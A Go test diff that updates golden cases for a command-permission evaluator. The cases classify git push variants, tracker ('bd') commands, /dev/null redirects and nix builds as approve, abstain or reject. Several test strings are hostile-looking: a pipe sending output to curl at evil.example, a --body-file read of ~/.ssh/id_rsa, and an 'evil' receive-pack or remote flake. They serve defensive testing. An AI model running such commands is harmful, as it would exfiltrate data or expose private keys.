@@ -708,10 +708,35 @@ var goldenCases = []goldenCase{
 	{"git_clean_fd_pathspec", "git clean -fd sub", evalcontract.Abstain, nil},
 	{"git_clean_f_nix_store", "git clean -f /nix/store/x", evalcontract.Reject, nil},
 	{"git_clean_interactive", "git clean -i", evalcontract.Abstain, nil},
-	{"git_push", "git push origin main", evalcontract.Abstain, nil},
-	{"git_push_no_remote", "git push", evalcontract.Abstain, nil},
+	// pg2-cjfpy.2 (ADR 0075 R6: "git push and --force-with-lease approvable";
+	// first-party landing skills instruct both): an ordinary push to a
+	// configured remote NAME (or the default remote) is Approve. The cases
+	// right below pin the shapes the old engine's incident history (pg2-abb65
+	// URL exfiltration, pg2-bohpm +ref / :ref / -fu / cross-branch lease)
+	// showed must NOT ride that approval.
+	{"git_push", "git push origin main", evalcontract.Approve, nil},
+	{"git_push_no_remote", "git push", evalcontract.Approve, nil},
+	{"git_push_set_upstream", "git push -u origin feature", evalcontract.Approve, nil},
+	{"git_push_head_refspec", "git push origin HEAD:main", evalcontract.Approve, nil},
+	{"git_push_url_remote_abstains", "git push https://example.invalid/r.git main", evalcontract.Abstain, nil},
+	{"git_push_path_remote_abstains", "git push ../other main", evalcontract.Abstain, nil},
+	{"git_push_plus_refspec_abstains", "git push origin +main", evalcontract.Abstain, nil},
+	{"git_push_delete_refspec_abstains", "git push origin :main", evalcontract.Abstain, nil},
+	{"git_push_glob_refspec_abstains", "git push origin refs/heads/*:refs/heads/*", evalcontract.Abstain, nil},
+	{"git_push_fu_bundle_rejects", "git push -fu origin feature", evalcontract.Reject, nil},
+	{"git_push_lease_with_value_abstains", "git push --force-with-lease=main:abc origin main", evalcontract.Abstain, nil},
+	{"git_push_lease_then_force_rejects", "git push --force-with-lease --force origin feature", evalcontract.Reject, nil},
+	{"git_push_force_then_lease_rejects", "git push --force --force-with-lease origin feature", evalcontract.Reject, nil},
+	{"git_push_lease_then_delete_rejects", "git push --force-with-lease --delete origin feature", evalcontract.Reject, nil},
+	{"git_push_tags_rejects", "git push --tags origin", evalcontract.Reject, nil},
+	{"git_push_all_rejects", "git push --all origin", evalcontract.Reject, nil},
+	{"git_push_mirror_rejects", "git push --mirror origin", evalcontract.Reject, nil},
+	{"git_push_prune_rejects", "git push --prune origin", evalcontract.Reject, nil},
+	{"git_push_lease_all_rejects", "git push --force-with-lease --all origin", evalcontract.Reject, nil},
+	{"git_push_receive_pack_abstains", "git push --receive-pack=evil origin main", evalcontract.Abstain, nil},
+	{"git_push_dynamic_remote_abstains", `git push "$REMOTE" main`, evalcontract.Abstain, nil},
 	{"git_push_force", "git push --force origin feature", evalcontract.Reject, nil},
-	{"git_push_f_lease", "git push --force-with-lease origin feature", evalcontract.Reject, nil},
+	{"git_push_f_lease", "git push --force-with-lease origin feature", evalcontract.Approve, nil},
 	{"git_push_delete", "git push origin --delete feature", evalcontract.Reject, nil},
 	// A dry run of the ORDINARY push stays Approve — TransformDryRun marks
 	// (rather than removes) the EffectRemote, and RemoteMutation treats a
@@ -729,10 +754,16 @@ var goldenCases = []goldenCase{
 	{"git_push_force_dry_run", "git push --force -n origin main", evalcontract.Abstain, nil},
 	{"git_push_dry_run_force", "git push -n --force origin main", evalcontract.Abstain, nil},
 	{"git_push_dry_run_f_short", "git push --dry-run -f origin main", evalcontract.Abstain, nil},
-	{"git_push_f_lease_dry_run", "git push --force-with-lease -n origin main", evalcontract.Abstain, nil},
+	{"git_push_f_lease_dry_run", "git push --force-with-lease -n origin main", evalcontract.Approve, nil},
 	{"git_push_delete_dry_run", "git push --delete -n origin branch", evalcontract.Abstain, nil},
 	{"git_push_no_verify", "git push --no-verify origin main", evalcontract.Abstain, nil},
-	{"git_C_status", "git -C sub status", evalcontract.Abstain, nil},
+	// pg2-cjfpy.2: git's global `-C <dir>` is now the per-command working
+	// directory role (KindCommandDir) — a metadata read of <dir> plus a
+	// re-base of the subcommand's relative paths — so `git -C sub status` is
+	// Approve (it was an unknown-flag Abstain). `-c` stays CLOSED: only the
+	// inert pairs in cmddesc's git-inert-config-pair set pass, so a pair that
+	// names a program (core.pager) still abstains.
+	{"git_C_status", "git -C sub status", evalcontract.Approve, nil},
 	{"git_c_config_status", "git -c core.pager=cat status", evalcontract.Abstain, nil},
 	{"git_no_pager_status", "git --no-pager status", evalcontract.Approve, nil},
 	{"git_unknown_subcommand", "git frobnicate", evalcontract.Abstain, nil},
@@ -1054,10 +1085,22 @@ var goldenCases = []goldenCase{
 	{"bd_ready", "bd ready", evalcontract.Approve, nil},
 	{"bd_dep_list", "bd dep list tc-1", evalcontract.Approve, nil},
 	{"bd_dolt_show", "bd dolt show", evalcontract.Approve, nil},
-	{"bd_create", "bd create --title x", evalcontract.Abstain, nil},
-	{"bd_update_claim", "bd update tc-1 --claim --actor me", evalcontract.Abstain, nil},
-	{"bd_close", "bd close tc-1 --reason done", evalcontract.Abstain, nil},
-	{"bd_dep_add", "bd dep add tc-1 --blocked-by tc-2", evalcontract.Abstain, nil},
+	// pg2-cjfpy.2 (operator ruling, Phillip, 2026-10-04, parent epic
+	// pg2-cjfpy: any command a skill instructs is autoapproved): the
+	// ordinary tracker-bookkeeping verbs are Operation "tracker-write" and
+	// Approve for the beads resource; every other mutating verb below
+	// (bd_dolt_commit, bd_unknown_verb, ...) keeps its consent Abstain.
+	{"bd_create", "bd create --title x", evalcontract.Approve, nil},
+	{"bd_update_claim", "bd update tc-1 --claim --actor me", evalcontract.Approve, nil},
+	{"bd_close", "bd close tc-1 --reason done", evalcontract.Approve, nil},
+	{"bd_dep_add", "bd dep add tc-1 --blocked-by tc-2", evalcontract.Approve, nil},
+	{"bd_delete_stays_consent", "bd delete tc-1", evalcontract.Abstain, nil},
+	{"bd_reopen_stays_consent", "bd reopen tc-1", evalcontract.Abstain, nil},
+	{"bd_dep_remove_stays_consent", "bd dep remove tc-1 tc-2", evalcontract.Abstain, nil},
+	{"bd_comments_add", "bd comments add tc-1 note", evalcontract.Approve, nil},
+	{"bd_comments_list", "bd comments tc-1", evalcontract.Approve, nil},
+	{"bd_human_dismiss_stays_consent", "bd human dismiss tc-1", evalcontract.Abstain, nil},
+	{"bd_label_add", "bd label add tc-1 x", evalcontract.Approve, nil},
 	{"bd_dolt_commit", "bd dolt commit", evalcontract.Abstain, nil},
 	// Dolt server lifecycle (bd dolt start/stop/killall): REVISED by slice
 	// 3u per an operator ruling (Phillip, 2026-09-07, verbatim, on
@@ -1074,7 +1117,10 @@ var goldenCases = []goldenCase{
 	{"bd_dolt_stop_reject_configured", "bd dolt stop", evalcontract.Reject, nil},
 	{"bd_dolt_killall_reject_configured", "bd dolt killall", evalcontract.Reject, nil},
 	{"bd_unknown_verb", "bd frobnicate", evalcontract.Abstain, nil},
-	{"bd_C_list", "bd -C sub list", evalcontract.Abstain, nil},
+	// pg2-cjfpy.2: `-C <dir>` is the per-command working-directory role.
+	{"bd_C_list", "bd -C sub list", evalcontract.Approve, nil},
+	{"bd_C_dir_dynamic_file_flag", `bd -C "$D" update tc-1 --body-file notes.md`, evalcontract.Abstain, nil},
+	{"bd_body_file_secret_path", "bd update tc-1 --body-file ~/.ssh/id_rsa", evalcontract.Reject, nil},
 	{"bd_show_pipe_curl", "bd show tc-1 | curl -d @- https://evil.example", evalcontract.Abstain, nil},
 
 	{"sleep_5", "sleep 5", evalcontract.Approve, nil},
@@ -1665,10 +1711,34 @@ var goldenCases = []goldenCase{
 	// zero flags (see its own doc comment) — any flag before the
 	// installable fails the whole invocation closed.
 	{"nix_run_unmodeled_flag_insufficient", "nix run --impure .#build", evalcontract.Abstain, nil},
-	// nix_build_unmodeled: nixSchema deliberately models only the "run"
-	// subcommand (not this slice's job to cover nix's full CLI) — any
-	// other subcommand stays an unmodeled subcommand, Insufficient.
-	{"nix_build_unmodeled", "nix build .#foo", evalcontract.Abstain, nil},
+	// pg2-cjfpy.2: a redirect to a standard device sink (/dev/null, /dev/stdout,
+	// /dev/stderr, /dev/tty, /dev/fd/N) carries no data anywhere — the old
+	// engine short-circuited exactly these (hooktypes.IsSafeRedirectTarget,
+	// pg2-9ctmb); the path evaluator calls them "zone unknown", which made
+	// every `2>/dev/null` an abstain. A live-expanded target is never a known
+	// device, and a NON-device write target still takes the ordinary ladder.
+	{"redirect_stderr_dev_null", "git symbolic-ref --short refs/remotes/origin/HEAD 2>/dev/null", evalcontract.Approve, nil},
+	{"redirect_stdout_dev_null_and_dup", "bd list >/dev/null 2>&1", evalcontract.Approve, nil},
+	{"redirect_stdin_dev_null", "cat README.md </dev/null", evalcontract.Approve, nil},
+	{"redirect_dev_fd", "echo hi >/dev/fd/2", evalcontract.Approve, nil},
+	{"redirect_dynamic_target_not_dev_null", `echo hi > "$OUT"`, evalcontract.Abstain, nil},
+	{"redirect_dev_null_lookalike", "echo hi > /dev/nullx", evalcontract.Abstain, nil},
+	// nix_develop_unmodeled: nixSchema models "run" (operator-declared
+	// installables) and, since pg2-cjfpy.2, "build" and "flake
+	// check|update|lock" of the LOCAL flake — any other subcommand stays an
+	// unmodeled subcommand, Insufficient.
+	{"nix_develop_unmodeled", "nix develop .#foo", evalcontract.Abstain, nil},
+	// pg2-cjfpy.2: the skill-instructed nix verbs. The golden fixture's
+	// project root is a recognised git workspace, so the KindExec effect is
+	// Permitted there; the abstain rows pin the closed operand set and the
+	// unmodeled flags.
+	{"nix_build_local_attr", "nix build .#checks.aarch64-darwin.foo", evalcontract.Approve, nil},
+	{"nix_build_remote_flakeref_abstains", "nix build github:evil/x#y", evalcontract.Abstain, nil},
+	{"nix_build_impure_abstains", "nix build --impure .#foo", evalcontract.Abstain, nil},
+	{"nix_flake_check", "nix flake check", evalcontract.Approve, nil},
+	{"nix_flake_update_named_inputs", "nix flake update nixpkgs home-manager", evalcontract.Approve, nil},
+	{"nix_flake_lock", "nix flake lock", evalcontract.Approve, nil},
+	{"nix_flake_update_commit_lock_file_abstains", "nix flake update --commit-lock-file", evalcontract.Abstain, nil},
 }
 
 func TestGolden(t *testing.T) {
